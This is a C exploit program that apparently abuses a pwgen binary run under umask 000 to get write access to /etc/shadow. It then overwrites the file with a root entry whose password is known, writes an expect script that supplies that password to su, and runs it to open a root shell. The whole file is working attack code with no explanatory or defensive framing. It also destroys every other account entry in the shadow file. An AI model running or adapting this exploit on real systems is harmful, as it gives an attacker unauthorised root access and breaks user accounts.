#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

#define PWGEN "/usr/local/bin/pwgen"
#define SHADOW_FILE "/etc/shadow"
#define EXPECT "/usr/bin/expect"
#define EXPECT_FILE "/home/user/expectfile"

// Shadow file entry for the root user.
static char *shadow_entry = "root:dOX2BR6OhsV3M:19612::::::";
// Password coresponding to the root shadow file entry.
static char *root_password = "q0Rk5LkU";

int main() {
    FILE *fd;
    char *args[3];
    int process;

    // Gain read-write access to /etc/shadow.
    umask(000);
    sleep(1);
    process = fork();
    if (process == 0) {
        args[0] = PWGEN;
        args[1] = "-w";
        args[2] = NULL;
        execvp(PWGEN, args);
        exit(1);
    }
    sleep(1);

    // Write the known password into the shadow file.
    fd = fopen(SHADOW_FILE, "w");
    if (fd == NULL) {
        printf("Failed to access the shadow file.");
        return 1;
    }
    fprintf(fd, "%s", shadow_entry);
    fclose(fd);

    sleep(1);

    // Login as root using the known password.
    fd = fopen(EXPECT_FILE, "w");
    fprintf(fd, "#!/usr/bin/expect\nspawn su\nexpect \"Password:\"\nsend \"%s\\n\"\ninteract", root_password);
    fclose(fd);

    args[0] = EXPECT;
    args[1] = EXPECT_FILE;
    args[2] = NULL;
    execvp(EXPECT, args);
    return 0;
}
